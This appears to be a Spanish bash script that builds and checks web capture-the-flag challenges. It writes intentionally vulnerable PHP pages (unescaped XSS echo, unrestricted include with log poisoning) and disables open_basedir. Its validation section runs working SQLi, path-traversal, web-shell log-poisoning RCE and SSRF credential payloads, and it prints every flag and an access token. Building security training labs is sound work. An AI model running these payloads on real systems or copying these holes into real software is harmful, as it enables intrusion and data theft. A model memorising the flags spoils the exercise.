#!/bin/bash
# =============================================================================
# CTF MGP — FIX QUIRÚRGICO XSS + LFI
# El VirtualHost :8181 YA está bien configurado — solo faltan los archivos
# =============================================================================
set -e

VERDE="\e[32m"; AMARILLO="\e[33m"; ROJO="\e[31m"
AZUL="\e[34m"; NEGRITA="\e[1m"; RESET="\e[0m"

[ "$EUID" -ne 0 ] && { echo -e "${ROJO}Ejecutar como root: sudo bash $0${RESET}"; exit 1; }

echo -e "${AZUL}${NEGRITA}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   CTF MGP — Fix Quirúrgico XSS + LFI                        ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

# =============================================================================
# DIAGNÓSTICO RÁPIDO
# =============================================================================
echo -e "${AMARILLO}[DIAG] Estado actual del filesystem...${RESET}"
echo -e "    DocumentRoot XSS: $(ls -la /var/www/html/xss/ 2>/dev/null || echo 'NO EXISTE')"
echo -e "    DocumentRoot LFI: $(ls -la /var/www/html/lfi/ 2>/dev/null || echo 'NO EXISTE')"
echo -e "    PHP version: $(php --version 2>/dev/null | head -1)"
echo -e "    open_basedir: $(php -r "echo ini_get('open_basedir') ?: '(vacío)';" 2>/dev/null)"
echo -e "    PHP ini usado: $(php --ini 2>/dev/null | grep 'Loaded Configuration' || true)"
echo ""

# =============================================================================
# FIX 1 — XSS: crear archivos directamente con tee (evita problemas de heredoc)
# =============================================================================
echo -e "${AMARILLO}[FIX 1] Creando archivos XSS en /var/www/html/xss/...${RESET}"

mkdir -p /var/www/html/xss

# Usar tee para escribir index.php
tee /var/www/html/xss/index.php > /dev/null <<'PHPEOF'
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Fast-Ship Rastreo de Paquetes</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f4f6f8;font-family:sans-serif;color:#1a1a2e}
header{background:#1a1a2e;color:#fff;padding:16px 40px;display:flex;align-items:center;gap:16px}
header h1{font-size:22px;font-weight:700}
header span{font-size:12px;color:#a0aec0}
.hero{background:#16213e;color:#fff;padding:60px 40px;text-align:center}
.hero h2{font-size:32px;margin-bottom:12px}
.hero p{color:#a0aec0;font-size:15px;margin-bottom:32px}
.search-box{display:flex;max-width:520px;margin:0 auto}
.search-box input{flex:1;padding:14px 18px;border:none;border-radius:8px 0 0 8px;font-size:15px;outline:none}
.search-box button{padding:14px 24px;background:#e94560;color:#fff;border:none;border-radius:0 8px 8px 0;cursor:pointer;font-size:15px;font-weight:600}
footer{text-align:center;padding:20px;color:#a0aec0;font-size:12px;border-top:1px solid #e2e8f0}
</style>
</head>
<body>
<header><div><h1>Fast-Ship</h1><span>Logistica y Rastreo Internacional</span></div></header>
<div class="hero">
  <h2>Rastrea tu paquete en tiempo real</h2>
  <p>Ingresa el numero de guia o nombre del remitente</p>
  <form class="search-box" action="search.php" method="GET">
    <input type="text" name="query" placeholder="Numero de guia...">
    <button type="submit">Buscar</button>
  </form>
</div>
<footer>Fast-Ship Logistics 2026 Sistema de rastreo v2.1.4</footer>
</body>
</html>
PHPEOF

tee /var/www/html/xss/search.php > /dev/null <<'PHPEOF'
<?php
header("Set-Cookie: session_flag=Comciberdef{xss_reflected_2026_found}; path=/");
$query = $_GET['query'] ?? '';
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Fast-Ship Resultados</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f4f6f8;font-family:sans-serif;color:#1a1a2e}
header{background:#1a1a2e;color:#fff;padding:16px 40px;display:flex;align-items:center;justify-content:space-between}
header h1{font-size:20px;font-weight:700}
.container{max-width:760px;margin:40px auto;padding:0 24px}
.result-box{background:#fff;border-radius:12px;padding:32px;box-shadow:0 2px 12px rgba(0,0,0,.07)}
.result-box h2{font-size:18px;margin-bottom:8px}
.query-echo{background:#edf2f7;border-left:4px solid #e94560;padding:14px 18px;font-size:15px;margin:16px 0}
.no-result{color:#718096;font-size:14px;margin-top:16px}
.back{display:inline-block;margin-top:24px;color:#e94560;font-size:14px;text-decoration:none}
</style>
</head>
<body>
<header>
  <h1>Fast-Ship</h1>
  <a href="index.php" style="color:#a0aec0;font-size:13px;text-decoration:none">Volver</a>
</header>
<div class="container">
  <div class="result-box">
    <h2>Resultados de busqueda</h2>
    <p style="font-size:13px;color:#718096">Buscaste:</p>
    <div class="query-echo"><?php echo $query; ?></div>
    <div class="no-result">No se encontraron resultados.</div>
    <a class="back" href="index.php">Nueva busqueda</a>
  </div>
</div>
</body>
</html>
PHPEOF

# Verificar que se escribieron
if [ -f /var/www/html/xss/index.php ] && [ -f /var/www/html/xss/search.php ]; then
    echo -e "${VERDE}    [OK] Archivos creados:${RESET}"
    ls -la /var/www/html/xss/
    echo -e "    Tamaño index.php:  $(wc -c < /var/www/html/xss/index.php) bytes"
    echo -e "    Tamaño search.php: $(wc -c < /var/www/html/xss/search.php) bytes"
else
    echo -e "${ROJO}    [ERROR] No se pudieron crear los archivos${RESET}"
    exit 1
fi

chown -R www-data:www-data /var/www/html/xss
chmod 644 /var/www/html/xss/index.php
chmod 644 /var/www/html/xss/search.php
chmod 755 /var/www/html/xss
echo -e "${VERDE}    [OK] Permisos aplicados${RESET}"

# =============================================================================
# FIX 2 — LFI: abrir open_basedir vía php.ini de Apache
# =============================================================================
echo ""
echo -e "${AMARILLO}[FIX 2] Desactivando open_basedir para PHP en Apache...${RESET}"

PHP_VER=$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;' 2>/dev/null || echo "8.3")
PHP_INI_APACHE="/etc/php/${PHP_VER}/apache2/php.ini"

echo -e "    php.ini Apache: $PHP_INI_APACHE"

if [ -f "$PHP_INI_APACHE" ]; then
    # Hacer backup
    cp "$PHP_INI_APACHE" "${PHP_INI_APACHE}.bak.ctf" 2>/dev/null || true

    # Comentar cualquier línea open_basedir activa
    sed -i 's/^open_basedir\s*=.*$/;open_basedir = (comentado para CTF)/' "$PHP_INI_APACHE"

    # Añadir open_basedir vacío al final
    grep -q "^open_basedir\s*=" "$PHP_INI_APACHE" || \
        echo "open_basedir =" >> "$PHP_INI_APACHE"

    echo -e "${VERDE}    [OK] open_basedir desactivado en $PHP_INI_APACHE${RESET}"
    echo -e "    Verificando: $(grep 'open_basedir' "$PHP_INI_APACHE" | grep -v '^;' || echo '(ninguna línea activa — correcto)')"
else
    echo -e "${AMARILLO}    [WARN] $PHP_INI_APACHE no encontrado — intentando vía .htaccess${RESET}"
fi

# También via .htaccess como respaldo
cat > /var/www/html/lfi/.htaccess <<'HTEOF'
<IfModule mod_php8.c>
    php_admin_value open_basedir ""
</IfModule>
<IfModule mod_php.c>
    php_admin_value open_basedir ""
</IfModule>
HTEOF
chown www-data:www-data /var/www/html/lfi/.htaccess

# Reescribir index.php LFI con ini_set adicional
tee /var/www/html/lfi/index.php > /dev/null <<'PHPEOF'
<?php
ini_set('open_basedir', '');
ini_set('display_errors', 0);
ini_set('log_errors', 0);

$log_file = '/var/log/app/access.log';
$ip   = $_SERVER['REMOTE_ADDR']     ?? '0.0.0.0';
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '-';
$uri  = $_SERVER['REQUEST_URI']     ?? '/';
$page = $_GET['page']               ?? '';
$ts   = date('Y-m-d H:i:s');

// *** LOG POISONING: User-Agent sin sanitizar ***
$entry = "[$ts] $ip GET $uri \"$ua\" 200\n";
@file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);

// *** LFI VULNERABLE: include directo sin restricciones ***
if ($page !== '') {
    @include($page);
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>COMCIBERDEF Log Viewer v2.3.1</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;color:#c9d1d9;font-family:sans-serif;min-height:100vh}
header{background:#16213e;border-bottom:2px solid #0f3460;padding:14px 32px;display:flex;align-items:center;gap:16px}
header h1{font-size:18px;color:#e94560;font-weight:700;letter-spacing:1px}
header span{font-size:11px;color:#718096;margin-left:auto}
.layout{display:flex;min-height:calc(100vh - 52px)}
.sidebar{width:220px;background:#16213e;border-right:1px solid #0f3460;padding:20px}
.sidebar h3{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:#718096;margin-bottom:12px}
.sidebar a{display:block;padding:9px 12px;border-radius:6px;color:#a0aec0;font-size:13px;text-decoration:none;margin-bottom:4px}
.sidebar a:hover,.sidebar a.active{background:#0f3460;color:#fff}
.main{flex:1;padding:28px}
.content-area{background:#16213e;border:1px solid #0f3460;border-radius:10px;padding:28px;line-height:1.7}
.content-area h2{color:#e94560;margin-bottom:14px;font-size:18px}
.content-area p{color:#a0aec0;font-size:14px;margin-bottom:8px}
.content-area code{background:#0f3460;padding:2px 6px;border-radius:4px;font-family:monospace;color:#63b3ed;font-size:13px}
.meta{font-size:11px;color:#4a5568;margin-top:24px;padding-top:12px;border-top:1px solid #0f3460}
</style>
</head>
<body>
<header>
  <h1>COMCIBERDEF Log Viewer v2.3.1</h1>
  <span>SISTEMA INTERNO ACCESO RESTRINGIDO</span>
</header>
<div class="layout">
  <div class="sidebar">
    <h3>Navegacion</h3>
    <a href="?page=pages/home.php"    class="<?= ($page==='pages/home.php')?'active':''    ?>">Inicio</a>
    <a href="?page=pages/news.php"    class="<?= ($page==='pages/news.php')?'active':''    ?>">Novedades</a>
    <a href="?page=pages/contact.php" class="<?= ($page==='pages/contact.php')?'active':'' ?>">Soporte</a>
    <div style="margin-top:24px;padding-top:16px;border-top:1px solid #0f3460">
      <h3>Sistema</h3>
      <a href="?page=pages/home.php">Ver Logs</a>
    </div>
  </div>
  <div class="main">
    <?php if ($page === ''): ?>
    <div class="content-area">
      <h2>Bienvenido</h2>
      <p>Selecciona una seccion del menu o accede con <code>?page=</code></p>
      <p style="margin-top:12px">Los registros se almacenan en <code>/var/log/app/access.log</code></p>
    </div>
    <?php endif; ?>
    <div class="meta">
      Log: <?= htmlspecialchars($log_file) ?> | IP: <?= htmlspecialchars($ip) ?>
    </div>
  </div>
</div>
</body>
</html>
PHPEOF

chown www-data:www-data /var/www/html/lfi/index.php
echo -e "${VERDE}    [OK] index.php LFI reescrito${RESET}"

# =============================================================================
# REINICIAR APACHE
# =============================================================================
echo ""
echo -e "${AMARILLO}[*] Reiniciando Apache...${RESET}"
systemctl restart apache2
sleep 2
echo -e "${VERDE}    [OK] Apache reiniciado${RESET}"

# Confirmar que los archivos siguen ahí después del restart
echo -e "${AMARILLO}    Archivos XSS post-restart:${RESET}"
ls -la /var/www/html/xss/ 2>/dev/null || echo "DIRECTORIO VACÍO O INEXISTENTE"

# =============================================================================
# VALIDACIÓN DIRECTA
# =============================================================================
echo ""
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo -e "${NEGRITA}  VALIDACIÓN DIRECTA${RESET}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo ""

PASS=0; FAIL=0
ok()   { echo -e "  ${VERDE}[OK]${RESET}   $1"; PASS=$((PASS+1)); }
fail() { echo -e "  ${ROJO}[FAIL]${RESET} $1"; FAIL=$((FAIL+1)); }

chk_http() {
    local CODE
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$2" 2>/dev/null || echo "000")
    [ "$CODE" = "$3" ] && ok "$1 (HTTP $CODE)" || fail "$1 (esperado $3, got $CODE)"
}
chk_body() {
    local BODY
    BODY=$(curl -s "$2" 2>/dev/null || echo "")
    echo "$BODY" | grep -q "$3" && ok "$1" || fail "$1"
}

echo -e "${AMARILLO}── Reto 1 ───────────────────────────────────────────${RESET}"
chk_http "Portal /sqli-login/" "http://localhost/sqli-login/" "200"
BODY=$(curl -sL --data "username=%27+OR+1%3D1+LIMIT+4%2C1+--+-&password=x" \
    "http://localhost/sqli-login/" 2>/dev/null || echo "")
echo "$BODY" | grep -q "Comciberdef{sqli_bypass_2026_ok}" && \
    ok "SQLi bypass → flag" || fail "SQLi bypass → flag no encontrada"

echo ""
echo -e "${AMARILLO}── Reto 2 XSS (puerto 8181) ─────────────────────────${RESET}"
chk_http "Portal :8181/xss/"       "http://localhost:8181/xss/"              "200"
chk_http "search.php responde"     "http://localhost:8181/xss/search.php?query=test" "200"
chk_body "search.php refleja input" "http://localhost:8181/xss/search.php?query=MARKER2026" "MARKER2026"
HDRS=$(curl -sI "http://localhost:8181/xss/search.php?query=x" 2>/dev/null || echo "")
echo "$HDRS" | grep -qi "Comciberdef{xss_reflected_2026_found}" && \
    ok "Cookie session_flag presente" || fail "Cookie session_flag ausente"

echo ""
echo -e "${AMARILLO}── Reto 3 ───────────────────────────────────────────${RESET}"
chk_http "Portal /sqli-blind/" "http://localhost/sqli-blind/" "200"
chk_body "Oráculo TRUE"  "http://localhost/sqli-blind/?id=1+AND+1%3D1" "encontrado"
chk_body "Oráculo FALSE" "http://localhost/sqli-blind/?id=1+AND+1%3D2" "no disponible"

echo ""
echo -e "${AMARILLO}── Reto 4 LFI ───────────────────────────────────────${RESET}"
chk_http "Portal /lfi/" "http://localhost/lfi/" "200"
chk_body "LFI lee /etc/passwd" \
    "http://localhost/lfi/?page=../../../etc/passwd" "root:x"
[ -f /flag.txt ] && ok "/flag.txt existe" || fail "/flag.txt no existe"
curl -s -A '<?php system($_GET["cmd"]); ?>' \
    "http://localhost/lfi/?page=pages/home.php" > /dev/null 2>&1
sleep 0.5
chk_body "Log Poisoning + RCE → /flag.txt" \
    "http://localhost/lfi/?page=/var/log/app/access.log&cmd=cat+/flag.txt" \
    "Comciberdef"
printf '[2026-01-15 08:12:04] 192.168.125.40 GET /lfi/ "Mozilla/5.0" 200\n' \
    > /var/log/app/access.log
chown www-data:www-data /var/log/app/access.log

echo ""
echo -e "${AMARILLO}── Reto 5 SSRF ──────────────────────────────────────${RESET}"
META_ST=$(systemctl is-active ctf-metadata 2>/dev/null || echo "inactive")
STOR_ST=$(systemctl is-active ctf-storage  2>/dev/null || echo "inactive")
[ "$META_ST" = "active" ] && ok "ctf-metadata activo" || fail "ctf-metadata inactivo"
[ "$STOR_ST" = "active" ] && ok "ctf-storage activo"  || fail "ctf-storage inactivo"
TOKEN="MGP2026-IAM-xK9mN3pQ7rT1vY5wZ8"
FBODY=$(curl -s -H "Authorization: Bearer ${TOKEN}" \
    "http://127.0.0.1:9999/secret/flag.txt" 2>/dev/null || echo "")
echo "$FBODY" | grep -q "Comciberdef{ssrf_bypass_2026_master}" && \
    ok "Storage entrega flag con token" || fail "Storage no entrega flag"
chk_body "SSRF bypass 0.0.0.0 → token" \
    "http://localhost/ssrf/preview.php?url=http://0.0.0.0:8888/latest/meta-data/iam/security-credentials/mgp-role" \
    "Token"
chk_http "Portal /ssrf/" "http://localhost/ssrf/" "200"

# =============================================================================
# RESUMEN
# =============================================================================
echo ""
TOTAL=$((PASS+FAIL))
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
printf "${NEGRITA}  RESULTADO: %d/%d controles pasados\n${RESET}" "$PASS" "$TOTAL"

if [ "$FAIL" -eq 0 ]; then
    echo -e "${VERDE}${NEGRITA}  ✓ TODOS LOS RETOS WEB LISTOS${RESET}"
else
    echo -e "${ROJO}${NEGRITA}  ✗ $FAIL fallaron — diagnóstico extra:${RESET}"
    echo ""
    # Si XSS sigue fallando, mostrar diagnóstico detallado
    if ! curl -s -o /dev/null -w "%{http_code}" \
         "http://localhost:8181/xss/" 2>/dev/null | grep -q "200"; then
        echo -e "${ROJO}  XSS aún falla — diagnóstico:${RESET}"
        echo "  Archivos en /var/www/html/xss/:"
        ls -la /var/www/html/xss/ 2>/dev/null || echo "  (directorio no existe)"
        echo "  curl verbose:"
        curl -v "http://localhost:8181/xss/" 2>&1 | grep -E "< |> |Connected|404|200" | head -15
        echo "  Error log:"
        tail -5 /var/log/apache2/xss_error.log 2>/dev/null || \
            tail -5 /var/log/apache2/error.log 2>/dev/null || true
    fi
    if ! curl -s "http://localhost/lfi/?page=../../../etc/passwd" \
         2>/dev/null | grep -q "root:x"; then
        echo -e "${ROJO}  LFI aún falla — open_basedir activo:${RESET}"
        echo "  $(php -r "echo ini_get('open_basedir') ?: '(vacío — correcto)';" 2>/dev/null)"
        echo "  Probar: curl 'http://localhost/lfi/?page=pages/home.php' → debe funcionar"
    fi
fi

echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo ""
echo -e "${NEGRITA}  URLs participantes:${RESET}"
echo "  R1 → http://192.168.125.150/sqli-login/  │ Comciberdef{sqli_bypass_2026_ok}"
echo "  R2 → http://192.168.125.150:8181/xss/    │ Comciberdef{xss_reflected_2026_found}"
echo "  R3 → http://192.168.125.150/sqli-blind/  │ Comciberdef{NavalCiber2026}"
echo "  R4 → http://192.168.125.150/lfi/         │ Comciberdef{lfi_log_poison_rce_2026}"
echo "  R5 → http://192.168.125.150/ssrf/        │ Comciberdef{ssrf_bypass_2026_master}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
